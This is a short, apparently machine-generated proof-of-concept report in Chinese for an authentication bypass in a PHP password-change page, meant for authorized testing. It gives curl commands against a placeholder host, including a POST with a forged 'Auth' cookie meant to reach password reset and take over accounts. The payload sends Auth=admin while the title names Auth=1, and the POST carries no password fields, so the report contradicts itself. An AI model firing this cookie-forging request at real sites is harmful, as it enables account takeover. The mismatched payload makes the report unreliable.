# POC — 058_08.php 密码修改页仅凭客户端可控 Cookie Auth=1 即通过认证，导致任意用户密码重置（账户接管）

- finding_id: `LLM-294d609e1b45`
- type: `auth_bypass` / CWE-287
- severity: `high`
- file: `058_08.php:14`

## 步骤

1. **确认目标可达且已获授权**  
```http
curl -sS -i 'http://TARGET:8080/058_08.php'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 认证绕过 载荷**  
```http
curl -sS -i -X POST 'http://TARGET:8080/058_08.php' \
  -H 'Cookie: Auth=admin'
```
预期：以未授权/伪造身份访问受保护资源返回 2xx。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**  
预期：出现与基线不同的内容、状态码、延迟或副作用

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。